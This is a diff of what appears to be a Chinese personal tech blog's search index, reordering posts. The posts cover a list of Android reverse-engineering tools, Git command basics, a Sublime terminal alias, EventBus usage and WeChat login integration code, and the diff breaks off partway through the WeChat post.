-<h2 id="静态分析工具"><a href="#静态分析工具" class="headerlink" title="静态分析工具"></a>静态分析工具</h2><ul>
-<li><p><strong>android-classyshark</strong></p>
-</li>
-<li><p><strong>jadx</strong></p>
-</li>
-<li><p><strong>JD-GUI</strong></p>
-</li>
-<li><p><strong>BytecodeViewer</strong></p>
-</li>
-<li><p><strong>Android Killer</strong></p>
-</li>
-</ul>
-<p><a href="https://down.52pojie.cn/Tools/Android_Tools/AndroidKiller_v1.3.1.zip" target="_blank" rel="noopener">Android Killer下载</a>  </p>
-<h2 id="动态调试工具"><a href="#动态调试工具" class="headerlink" title="动态调试工具"></a>动态调试工具</h2><ul>
-<li><p><strong>JEB</strong></p>
-</li>
-<li><p><strong>jdb</strong></p>
-</li>
-<li><p><strong>Android Studio/Intellij IDEA</strong></p>
-</li>
-<li><p><strong>gdb</strong></p>
-</li>
-<li><p><strong>IDA Pro</strong></p>
-</li>
-</ul>
-<h2 id="Hook框架"><a href="#Hook框架" class="headerlink" title="Hook框架"></a>Hook框架</h2><ul>
-<li><p><strong>Cydia Substrate</strong></p>
-</li>
-<li><p><strong>Xposed</strong></p>
-</li>
-<li><p><strong>adbi</strong></p>
-</li>
-<li><p><strong>Frida</strong></p>
-</li>
-</ul>
-<h2 id="沙盒环境"><a href="#沙盒环境" class="headerlink" title="沙盒环境"></a>沙盒环境</h2><ul>
-<li><strong>DroidBox</strong></li>
-</ul>
-]]></content>
-      <categories>
-        <category>android逆向</category>
-      </categories>
-      <tags>
-        <tag>android逆向</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>陶然四季</title>
     <url>/post/882445833.html</url>
     <content><![CDATA[<!-- <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=29771932&auto=1&height=66"></iframe> -->
@@ -6861,6 +6804,68 @@ pip install request
       </categories>
       <tags>
         <tag>biu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Android逆向工具介绍</title>
+    <url>/post/1830912127.html</url>
+    <content><![CDATA[<h2 id="反汇编工具"><a href="#反汇编工具" class="headerlink" title="反汇编工具"></a>反汇编工具</h2><ul>
+<li><strong>Apktool/ShakaApktool</strong></li>
+</ul>
+<p><a href="https://bitbucket.org/iBotPeaches/apktool/downloads/" target="_blank" rel="noopener">apktool Download</a>  </p>
+<p><a href="https://github.com/rover12421/ShakaApktool" target="_blank" rel="noopener">ShakaApktool Github</a> 作者已经不更新了  </p>
+<ul>
+<li><p><strong>smali/baksmali</strong></p>
+</li>
+<li><p><strong>dex2jar</strong></p>
+</li>
+<li><p><strong>enjarify</strong></p>
+</li>
+</ul>
+<h2 id="静态分析工具"><a href="#静态分析工具" class="headerlink" title="静态分析工具"></a>静态分析工具</h2><ul>
+<li><p><strong>android-classyshark</strong></p>
+</li>
+<li><p><strong>jadx</strong></p>
+</li>
+<li><p><strong>JD-GUI</strong></p>
+</li>
+<li><p><strong>BytecodeViewer</strong></p>
+</li>
+<li><p><strong>Android Killer</strong></p>
+</li>
+</ul>
+<p><a href="https://down.52pojie.cn/Tools/Android_Tools/AndroidKiller_v1.3.1.zip" target="_blank" rel="noopener">Android Killer下载</a>  </p>
+<h2 id="动态调试工具"><a href="#动态调试工具" class="headerlink" title="动态调试工具"></a>动态调试工具</h2><ul>
+<li><p><strong>JEB</strong></p>
+</li>
+<li><p><strong>jdb</strong></p>
+</li>
+<li><p><strong>Android Studio/Intellij IDEA</strong></p>
+</li>
+<li><p><strong>gdb</strong></p>
+</li>
+<li><p><strong>IDA Pro</strong></p>
+</li>
+</ul>
+<h2 id="Hook框架"><a href="#Hook框架" class="headerlink" title="Hook框架"></a>Hook框架</h2><ul>
+<li><p><strong>Cydia Substrate</strong></p>
+</li>
+<li><p><strong>Xposed</strong></p>
+</li>
+<li><p><strong>adbi</strong></p>
+</li>
+<li><p><strong>Frida</strong></p>
+</li>
+</ul>
+<h2 id="沙盒环境"><a href="#沙盒环境" class="headerlink" title="沙盒环境"></a>沙盒环境</h2><ul>
+<li><strong>DroidBox</strong></li>
+</ul>
+]]></content>
+      <categories>
+        <category>android逆向</category>
+      </categories>
+      <tags>
+        <tag>android逆向</tag>
       </tags>
   </entry>
   <entry>
@@ -9321,69 +9326,6 @@ public class BaseFragment extends Fragment {
       </tags>
   </entry>
   <entry>
-    <title>Git命令行基础</title>
-    <url>/post/744454998.html</url>
-    <content><![CDATA[<h2 id="Git命令行基础"><a href="#Git命令行基础" class="headerlink" title="Git命令行基础"></a>Git命令行基础</h2><p>Git是一个开源的分布式版本控制工具  </p>
-<h2 id="配置身份"><a href="#配置身份" class="headerlink" title="配置身份"></a>配置身份</h2><p><img src="http://upload-images.jianshu.io/upload_images/2590671-227984aa4a843aea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="配置身份"></p>
-<pre><code>git config --global user.name &quot;Tony&quot;
-git config --global user.email &quot;tony@gmail.com&quot;
-</code></pre><h2 id="检查是否配置成功"><a href="#检查是否配置成功" class="headerlink" title="检查是否配置成功"></a>检查是否配置成功</h2><p><img src="http://upload-images.jianshu.io/upload_images/2590671-928c9c6757dc67e0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="检查配置"></p>
-<pre><code>git config --global user.name 
-git config --global user.email
-</code></pre><h2 id="创建本地代码仓库"><a href="#创建本地代码仓库" class="headerlink" title="创建本地代码仓库"></a>创建本地代码仓库</h2><p><img src="http://upload-images.jianshu.io/upload_images/2590671-e754601d1294c2da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="创建本地仓库"></p>
-<pre><code>git init
-</code></pre><p>仓库创建完成后会在项目目录下生成一个隐藏的.git文件夹 这个文件夹就是用来记录本地所有的Git操作的<br>如果你想要删除本地仓库 只需要删除这个文件夹就行  </p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-3dff03268e6c368d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git"></p>
-<h2 id="提交本地代码"><a href="#提交本地代码" class="headerlink" title="提交本地代码"></a>提交本地代码</h2><pre><code>git add [提交的文件名] // 提交一个文件 
-
-git add . // 提交所有文件
-</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-7e2ae3e2d7d6b0ce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git add"></p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-5a267cd07270af2f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git add ."></p>
-<p>现在所有文件都加好了  然后用commit命令提交下  </p>
-<pre><code>git commit -m &quot;First commit.&quot;
-</code></pre><h2 id="忽略文件"><a href="#忽略文件" class="headerlink" title="忽略文件"></a>忽略文件</h2><p>在项目中创建  .gitignore 文件  </p>
-<p>在.gitignore文件下 每行指定的文件或目录会排除在版本控制外</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-1fb5b8fd5616d1da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=".gitignore"></p>
-<h2 id="查看修改内容"><a href="#查看修改内容" class="headerlink" title="查看修改内容"></a>查看修改内容</h2><pre><code>git status
-</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-2ce1bd904ae1ed59.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git status"></p>
-<h2 id="查看更改内容"><a href="#查看更改内容" class="headerlink" title="查看更改内容"></a>查看更改内容</h2><pre><code>git diff
-</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-fbf6e8ddf3bd958b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git diff"></p>
-<h2 id="撤销未提交的修改"><a href="#撤销未提交的修改" class="headerlink" title="撤销未提交的修改"></a>撤销未提交的修改</h2><pre><code>git checkout
-</code></pre><h2 id="撤回提交"><a href="#撤回提交" class="headerlink" title="撤回提交"></a>撤回提交</h2><pre><code>git reset
-</code></pre><h2 id="查看提交记录"><a href="#查看提交记录" class="headerlink" title="查看提交记录"></a>查看提交记录</h2><pre><code>git log
-</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-3446be699c5f2adb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git log"></p>
-<p>查看修改一行  </p>
-<pre><code>git log 31f8f5c098c2b1988deea9a99a4511e35f85f0b6 -1
-</code></pre><p>查看具体修改内容  </p>
-<pre><code>git log 31f8f5c098c2b1988deea9a99a4511e35f85f0b6 -1 -p
-</code></pre><p>##查看分支  </p>
-<pre><code>git branch    
-</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-2778e9e774286b00.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git branch"></p>
-<h2 id="建立分支"><a href="#建立分支" class="headerlink" title="建立分支"></a>建立分支</h2><pre><code>git branch version1.0
-</code></pre><h2 id="切换分支"><a href="#切换分支" class="headerlink" title="切换分支"></a>切换分支</h2><pre><code>git checkout version1.0
-</code></pre><h2 id="合并分支"><a href="#合并分支" class="headerlink" title="合并分支"></a>合并分支</h2><pre><code>git checkout master
-git merge version1.0
-</code></pre><h2 id="删除分支"><a href="#删除分支" class="headerlink" title="删除分支"></a>删除分支</h2><pre><code>git branch -D version1.0
-</code></pre><h2 id="与远程版本库协作"><a href="#与远程版本库协作" class="headerlink" title="与远程版本库协作"></a>与远程版本库协作</h2><pre><code>git clone https://github.com/example/text.git
-</code></pre><h2 id="本地修改内容同步到远程版本库"><a href="#本地修改内容同步到远程版本库" class="headerlink" title="本地修改内容同步到远程版本库"></a>本地修改内容同步到远程版本库</h2><pre><code>git push origin master
-</code></pre><h2 id="远程版本库修改同步到本地"><a href="#远程版本库修改同步到本地" class="headerlink" title="远程版本库修改同步到本地"></a>远程版本库修改同步到本地</h2><pre><code>git fetch origin master
-</code></pre><h2 id="查看远程版本库修改了那些东西"><a href="#查看远程版本库修改了那些东西" class="headerlink" title="查看远程版本库修改了那些东西"></a>查看远程版本库修改了那些东西</h2><pre><code>git diff origin/master
-</code></pre><p>之后在调用merge命令将origin/master分支上的修改合并到主分支上  </p>
-<pre><code>git merge origin/master
-</code></pre><p>pull命令是相当于 fetch和merge两个命令放在一起执行  </p>
-<pre><code>git pull origon master
-</code></pre><hr>
-<h2 id="查看已存放：（这个最有用）"><a href="#查看已存放：（这个最有用）" class="headerlink" title="查看已存放：（这个最有用）"></a>查看已存放：（这个最有用）</h2><pre><code>git ls-files
-</code></pre><h2 id="查看还没添加的文件："><a href="#查看还没添加的文件：" class="headerlink" title="查看还没添加的文件："></a>查看还没添加的文件：</h2><pre><code>git status
-</code></pre>]]></content>
-      <categories>
-        <category>git</category>
-      </categories>
-      <tags>
-        <tag>git</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>设计模式-策略模式（strategy）</title>
     <url>/post/2113223531.html</url>
     <content><![CDATA[<h2 id="策略模式"><a href="#策略模式" class="headerlink" title="策略模式"></a>策略模式</h2><p>视频地址<br><a href="http://www.imooc.com/video/3213" target="_blank" rel="noopener">http://www.imooc.com/video/3213</a></p>
@@ -9471,6 +9413,69 @@ public void fly(){
       </tags>
   </entry>
   <entry>
+    <title>Git命令行基础</title>
+    <url>/post/744454998.html</url>
+    <content><![CDATA[<h2 id="Git命令行基础"><a href="#Git命令行基础" class="headerlink" title="Git命令行基础"></a>Git命令行基础</h2><p>Git是一个开源的分布式版本控制工具  </p>
+<h2 id="配置身份"><a href="#配置身份" class="headerlink" title="配置身份"></a>配置身份</h2><p><img src="http://upload-images.jianshu.io/upload_images/2590671-227984aa4a843aea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="配置身份"></p>
+<pre><code>git config --global user.name &quot;Tony&quot;
+git config --global user.email &quot;tony@gmail.com&quot;
+</code></pre><h2 id="检查是否配置成功"><a href="#检查是否配置成功" class="headerlink" title="检查是否配置成功"></a>检查是否配置成功</h2><p><img src="http://upload-images.jianshu.io/upload_images/2590671-928c9c6757dc67e0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="检查配置"></p>
+<pre><code>git config --global user.name 
+git config --global user.email
+</code></pre><h2 id="创建本地代码仓库"><a href="#创建本地代码仓库" class="headerlink" title="创建本地代码仓库"></a>创建本地代码仓库</h2><p><img src="http://upload-images.jianshu.io/upload_images/2590671-e754601d1294c2da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="创建本地仓库"></p>
+<pre><code>git init
+</code></pre><p>仓库创建完成后会在项目目录下生成一个隐藏的.git文件夹 这个文件夹就是用来记录本地所有的Git操作的<br>如果你想要删除本地仓库 只需要删除这个文件夹就行  </p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-3dff03268e6c368d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git"></p>
+<h2 id="提交本地代码"><a href="#提交本地代码" class="headerlink" title="提交本地代码"></a>提交本地代码</h2><pre><code>git add [提交的文件名] // 提交一个文件 
+
+git add . // 提交所有文件
+</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-7e2ae3e2d7d6b0ce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git add"></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-5a267cd07270af2f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git add ."></p>
+<p>现在所有文件都加好了  然后用commit命令提交下  </p>
+<pre><code>git commit -m &quot;First commit.&quot;
+</code></pre><h2 id="忽略文件"><a href="#忽略文件" class="headerlink" title="忽略文件"></a>忽略文件</h2><p>在项目中创建  .gitignore 文件  </p>
+<p>在.gitignore文件下 每行指定的文件或目录会排除在版本控制外</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-1fb5b8fd5616d1da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=".gitignore"></p>
+<h2 id="查看修改内容"><a href="#查看修改内容" class="headerlink" title="查看修改内容"></a>查看修改内容</h2><pre><code>git status
+</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-2ce1bd904ae1ed59.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git status"></p>
+<h2 id="查看更改内容"><a href="#查看更改内容" class="headerlink" title="查看更改内容"></a>查看更改内容</h2><pre><code>git diff
+</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-fbf6e8ddf3bd958b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git diff"></p>
+<h2 id="撤销未提交的修改"><a href="#撤销未提交的修改" class="headerlink" title="撤销未提交的修改"></a>撤销未提交的修改</h2><pre><code>git checkout
+</code></pre><h2 id="撤回提交"><a href="#撤回提交" class="headerlink" title="撤回提交"></a>撤回提交</h2><pre><code>git reset
+</code></pre><h2 id="查看提交记录"><a href="#查看提交记录" class="headerlink" title="查看提交记录"></a>查看提交记录</h2><pre><code>git log
+</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-3446be699c5f2adb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git log"></p>
+<p>查看修改一行  </p>
+<pre><code>git log 31f8f5c098c2b1988deea9a99a4511e35f85f0b6 -1
+</code></pre><p>查看具体修改内容  </p>
+<pre><code>git log 31f8f5c098c2b1988deea9a99a4511e35f85f0b6 -1 -p
+</code></pre><p>##查看分支  </p>
+<pre><code>git branch    
+</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-2778e9e774286b00.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git branch"></p>
+<h2 id="建立分支"><a href="#建立分支" class="headerlink" title="建立分支"></a>建立分支</h2><pre><code>git branch version1.0
+</code></pre><h2 id="切换分支"><a href="#切换分支" class="headerlink" title="切换分支"></a>切换分支</h2><pre><code>git checkout version1.0
+</code></pre><h2 id="合并分支"><a href="#合并分支" class="headerlink" title="合并分支"></a>合并分支</h2><pre><code>git checkout master
+git merge version1.0
+</code></pre><h2 id="删除分支"><a href="#删除分支" class="headerlink" title="删除分支"></a>删除分支</h2><pre><code>git branch -D version1.0
+</code></pre><h2 id="与远程版本库协作"><a href="#与远程版本库协作" class="headerlink" title="与远程版本库协作"></a>与远程版本库协作</h2><pre><code>git clone https://github.com/example/text.git
+</code></pre><h2 id="本地修改内容同步到远程版本库"><a href="#本地修改内容同步到远程版本库" class="headerlink" title="本地修改内容同步到远程版本库"></a>本地修改内容同步到远程版本库</h2><pre><code>git push origin master
+</code></pre><h2 id="远程版本库修改同步到本地"><a href="#远程版本库修改同步到本地" class="headerlink" title="远程版本库修改同步到本地"></a>远程版本库修改同步到本地</h2><pre><code>git fetch origin master
+</code></pre><h2 id="查看远程版本库修改了那些东西"><a href="#查看远程版本库修改了那些东西" class="headerlink" title="查看远程版本库修改了那些东西"></a>查看远程版本库修改了那些东西</h2><pre><code>git diff origin/master
+</code></pre><p>之后在调用merge命令将origin/master分支上的修改合并到主分支上  </p>
+<pre><code>git merge origin/master
+</code></pre><p>pull命令是相当于 fetch和merge两个命令放在一起执行  </p>
+<pre><code>git pull origon master
+</code></pre><hr>
+<h2 id="查看已存放：（这个最有用）"><a href="#查看已存放：（这个最有用）" class="headerlink" title="查看已存放：（这个最有用）"></a>查看已存放：（这个最有用）</h2><pre><code>git ls-files
+</code></pre><h2 id="查看还没添加的文件："><a href="#查看还没添加的文件：" class="headerlink" title="查看还没添加的文件："></a>查看还没添加的文件：</h2><pre><code>git status
+</code></pre>]]></content>
+      <categories>
+        <category>git</category>
+      </categories>
+      <tags>
+        <tag>git</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Burp抓Android的包</title>
     <url>/post/1340440380.html</url>
     <content><![CDATA[<h1 id="Burp抓Android的包"><a href="#Burp抓Android的包" class="headerlink" title="Burp抓Android的包"></a>Burp抓Android的包</h1><h2 id="设置ip"><a href="#设置ip" class="headerlink" title="设置ip"></a>设置ip</h2><p>设置-网络-查看ip地址  </p>
@@ -9495,28 +9500,6 @@ public void fly(){
       <tags>
         <tag>android逆向</tag>
         <tag>android安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>mac_终端用sublime打开文件</title>
-    <url>/post/576883658.html</url>
-    <content><![CDATA[<p><strong>打开文件</strong></p>
-<pre><code>vi ~/.bash_profile
-</code></pre><p><strong>添加命令</strong></p>
-<pre><code>alias subl=\&#39;&#39;/Applications/Sublime Text.app/Contents/SharedSupport/bin/subl&#39;\&#39;
-</code></pre><p><strong>启动</strong></p>
-<pre><code>source ~/.bash_profile 
-</code></pre><p><strong>使用命令</strong></p>
-<pre><code>subl 文件/目录
-
-subl ./_posts/2018-08-03-mac_sublime_open_file.md
-</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/u011240016/article/details/54434923" target="_blank" rel="noopener">终端用sublime打开文件的方法</a></p>
-]]></content>
-      <categories>
-        <category>macos</category>
-      </categories>
-      <tags>
-        <tag>macos</tag>
       </tags>
   </entry>
   <entry>
@@ -9598,6 +9581,28 @@ XCTF总决赛
       </categories>
       <tags>
         <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>mac_终端用sublime打开文件</title>
+    <url>/post/576883658.html</url>
+    <content><![CDATA[<p><strong>打开文件</strong></p>
+<pre><code>vi ~/.bash_profile
+</code></pre><p><strong>添加命令</strong></p>
+<pre><code>alias subl=\&#39;&#39;/Applications/Sublime Text.app/Contents/SharedSupport/bin/subl&#39;\&#39;
+</code></pre><p><strong>启动</strong></p>
+<pre><code>source ~/.bash_profile 
+</code></pre><p><strong>使用命令</strong></p>
+<pre><code>subl 文件/目录
+
+subl ./_posts/2018-08-03-mac_sublime_open_file.md
+</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/u011240016/article/details/54434923" target="_blank" rel="noopener">终端用sublime打开文件的方法</a></p>
+]]></content>
+      <categories>
+        <category>macos</category>
+      </categories>
+      <tags>
+        <tag>macos</tag>
       </tags>
   </entry>
   <entry>
@@ -10429,6 +10434,53 @@ sql语句不能含有特殊符号
       </tags>
   </entry>
   <entry>
+    <title>android EventBus 使用</title>
+    <url>/post/3369655730.html</url>
+    <content><![CDATA[<p>2017 10 27<br>EventBus是什么？<br>首先有两个概念发布者/订阅者  </p>
+<p>发布者就是 发送事件<br>订阅者 就是接收事件  </p>
+<pre><code>gradle
+
+compile &#39;org.greenrobot:eventbus:3.0.0&#39;
+</code></pre><p>1.定义事件</p>
+<pre><code>
+// 定义事件 这个就是你要传送的数据实体类
+public static class MessageEvent { /* Additional fields if needed */ }
+</code></pre>
+
+
+<p>2.准备订阅者</p>
+<pre><code>
+@Subscribe(threadMode = ThreadMode.MAIN)  
+public void onMessageEvent(MessageEvent event) {/* Do something */};
+
+// 订阅者 接受数据的方法 threadMode  是运行在什么线程模式
+http://greenrobot.org/eventbus/documentation/delivery-threads-threadmode/
+</code></pre>
+
+<p>注册和取消注册订阅者</p>
+<pre><code> @Override
+ public void onStart() {
+     super.onStart();
+     EventBus.getDefault().register(this);
+ }
+
+ @Override
+ public void onStop() {
+     super.onStop();
+     EventBus.getDefault().unregister(this);
+ }
+</code></pre><p>3.发送事件</p>
+<pre><code>`EventBus.getDefault().post(new MessageEvent());`
+</code></pre>]]></content>
+      <categories>
+        <category>android</category>
+      </categories>
+      <tags>
+        <tag>android</tag>
+        <tag>eventbus</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>android 代码样式规范</title>
     <url>/post/208407023.html</url>
     <content><![CDATA[<p>原文地址 把重点记录下<br><a href="https://source.android.com/source/code-style.html" target="_blank" rel="noopener">https://source.android.com/source/code-style.html</a></p>
@@ -10521,271 +10573,6 @@ sql语句不能含有特殊符号
       <tags>
         <tag>android</tag>
         <tag>code_standard</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>android EventBus 使用</title>
-    <url>/post/3369655730.html</url>
-    <content><![CDATA[<p>2017 10 27<br>EventBus是什么？<br>首先有两个概念发布者/订阅者  </p>
-<p>发布者就是 发送事件<br>订阅者 就是接收事件  </p>
-<pre><code>gradle
-
-compile &#39;org.greenrobot:eventbus:3.0.0&#39;
-</code></pre><p>1.定义事件</p>
-<pre><code>
-// 定义事件 这个就是你要传送的数据实体类
-public static class MessageEvent { /* Additional fields if needed */ }
-</code></pre>
-
-
-<p>2.准备订阅者</p>
-<pre><code>
-@Subscribe(threadMode = ThreadMode.MAIN)  
-public void onMessageEvent(MessageEvent event) {/* Do something */};
-
-// 订阅者 接受数据的方法 threadMode  是运行在什么线程模式
-http://greenrobot.org/eventbus/documentation/delivery-threads-threadmode/
-</code></pre>
-
-<p>注册和取消注册订阅者</p>
-<pre><code> @Override
- public void onStart() {
-     super.onStart();
-     EventBus.getDefault().register(this);
- }
-
- @Override
- public void onStop() {
-     super.onStop();
-     EventBus.getDefault().unregister(this);
- }
-</code></pre><p>3.发送事件</p>
-<pre><code>`EventBus.getDefault().post(new MessageEvent());`
-</code></pre>]]></content>
-      <categories>
-        <category>android</category>
-      </categories>
-      <tags>
-        <tag>android</tag>
-        <tag>eventbus</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>android微信第三方登录2</title>
-    <url>/post/273860866.html</url>
-    <content><![CDATA[<p>利用http与微信通信换取用户信息和openid<br>使用了okhttp作为http通信的框架  </p>
-<hr>
-<ol>
-<li><p>首先实例化okhttp连接  </p>
-<p> <code>private final OkHttpClient client = new OkHttpClient();</code></p>
-</li>
-</ol>
-<h6 id="获得code"><a href="#获得code" class="headerlink" title="获得code"></a>获得code</h6><pre><code>case BaseResp.ErrCode.ERR_OK:
-//      可用以下两种方法获得code
-//      resp.toBundle(bundle);
-//      Resp sp = new Resp(bundle);
-//      String code = sp.code;
-//      或者
-String code = ((SendAuth.Resp) baseResp).code;
-String state = ((SendAuth.Resp) baseResp).state;
-Toast.makeText(getApplicationContext(), &quot;恭喜这是你的code&quot; + code, Toast.LENGTH_LONG).show();
-Log.e(TAG, &quot;onResp: &quot; + code);
-try {
-    getAccess_token(code);
-} catch (Exception e) {
-    e.printStackTrace();
-}
-//上面的code就是接入指南里要拿到的code
-break;
-</code></pre><hr>
-<h6 id="根据code获取用户信息"><a href="#根据code获取用户信息" class="headerlink" title="根据code获取用户信息"></a>根据code获取用户信息</h6><pre><code>private void getAccess_token(String code) throws Exception {
-    String url = &quot;https://api.weixin.qq.com/sns/oauth2/access_token?&quot; +
-            &quot;appid=&quot; + ConfigUtil.Wechat_Appid +
-            &quot;&amp;secret=&quot; + ConfigUtil.Wechat_AppSecret +
-            &quot;&amp;code=&quot; + code +
-            &quot;&amp;grant_type=authorization_code&quot;;
-    run(url);
-}
-</code></pre><hr>
-<h6 id="引入okhttp包"><a href="#引入okhttp包" class="headerlink" title="引入okhttp包"></a>引入okhttp包</h6><p><img src="http://upload-images.jianshu.io/upload_images/2590671-e535b2d91c6473b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="引入okhttp的包"></p>
-<pre><code>//通过http与微信通信
-public void run(String url) throws Exception {
-final Request request = new Request.Builder()
-        //.url(&quot;http://publicobject.com/helloworld.txt&quot;)
-        .url(url)
-        .get()
-        .build();
-
-client.newCall(request).enqueue(new Callback() {
-    @Override
-    public void onFailure(Call call, IOException e) {
-        e.printStackTrace();
-    }
-
-    @Override
-    public void onResponse(Call call, Response response) throws IOException {
-        if (!response.isSuccessful()) throw new IOException(&quot;Unexpected code &quot; + response);
-        try {
-            String responseStr=response.body().string();
-            JSONObject jsonObject = new JSONObject(responseStr);
-            System.out.println(TAG + jsonObject.getString(&quot;access_token&quot;));//在回调中获取access_token
-        } catch (JSONException e) {
-            e.printStackTrace();
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-
-
-    }
-});
-}
-</code></pre><h5 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h5><p>如果微信调不起来<br>仔细检查签名是否正确<br>如果修改过签名<br>可以重新安装下微信再试一下  </p>
-]]></content>
-      <categories>
-        <category>android</category>
-      </categories>
-      <tags>
-        <tag>android</tag>
-        <tag>weixin</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>android微信第三方登录1</title>
-    <url>/post/2304481464.html</url>
-    <content><![CDATA[<p><a href="https://github.com/shaomiao/AndroidWechatTest" target="_blank" rel="noopener">github测试地址</a><br><a href="https://pay.weixin.qq.com/wiki/doc/api/app/app.php?chapter=11_1" target="_blank" rel="noopener">微信SDK下载地址</a><br><a href="https://open.weixin.qq.com/" target="_blank" rel="noopener">微信开放平台</a><br><a href="https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=1417751808&amp;token=dcf5c640a7da2e579f50e32e282eb1bc1f384c0b&amp;lang=zh_CN" target="_blank" rel="noopener">微信api</a>  </p>
-<h2 id="开始接入微信登录"><a href="#开始接入微信登录" class="headerlink" title="开始接入微信登录"></a>开始接入微信登录</h2><p>1.申请你的AppID<br>注意：  </p>
-<h5 id="包名正确（重要）"><a href="#包名正确（重要）" class="headerlink" title="包名正确（重要）"></a>包名正确（重要）</h5><h5 id="签名正确（重要）"><a href="#签名正确（重要）" class="headerlink" title="签名正确（重要）"></a>签名正确（重要）</h5><p>微信提供的签名生成工具<br>把包名添加上去就可以获取签名<br>注意：把要获取签名的应用安装在手机上<br><a href="https://res.wx.qq.com/open/zh_CN/htmledition/res/dev/download/sdk/Gen_Signature_Android2.apk" target="_blank" rel="noopener">获取签名应用</a>  </p>
-<p>2.下载开发工具包<br><a href="https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=open1419319167&amp;lang=zh_CN" target="_blank" rel="noopener">https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=open1419319167&amp;lang=zh_CN</a>  </p>
-<p>3.在项目中引入开发包<br><img src="http://upload-images.jianshu.io/upload_images/2590671-b6783667e961b04b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在项目中引入开发工具包">  </p>
-<p>4.使用开发工具包<br>下面代码都是在MainActivity中<br>[1]注册微信  </p>
-<pre><code>
-private static final String APP_ID="你的appid";
-private IWXAPI api;
-private void regToWx(){
-    api= WXAPIFactory.createWXAPI(this,APP_ID,true);
-    api.registerApp(APP_ID);
-}
-@Override
-protected void onCreate(Bundle savedInstanceState) {
-      super.onCreate(savedInstanceState);
-      setContentView(R.layout.activity_main);
-      //注册微信
-      regToWx();
-}
-</code></pre>
-
-
-
-
-<p>[2]登录微信</p>
-<pre><code>@Override
-protected void onCreate(Bundle savedInstanceState) {
-    super.onCreate(savedInstanceState);
-    setContentView(R.layout.activity_main);
-    //注册微信
-    regToWx();
-    findViewById(R.id.wechat_login).setOnClickListener(new View.OnClickListener() {
-        @Override
-        public void onClick(View v) {
-            //登录微信
-            final SendAuth.Req req = new SendAuth.Req();
-            req.scope = &quot;snsapi_userinfo&quot;;
-            req.state = &quot;wechat_sdk_demo_test&quot;;
-            api.sendReq(req);
-        }
-    });
-}
-</code></pre><p>5.下面是最重要的一步。。。。<br>[1]建包<br>注意：要在你的包名下新建 wxapi 包<br>你的包名.wxapi  </p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-972bd98cefcbe360.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="你的包名.wxapi"></p>
-<p>[2]建立与微信通讯的activity<br>在wxapi下新建activity<br>WXEntryActivity<br>[3]在AndroidManifest.xml中添加权限.   </p>
-<pre><code>&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt; 
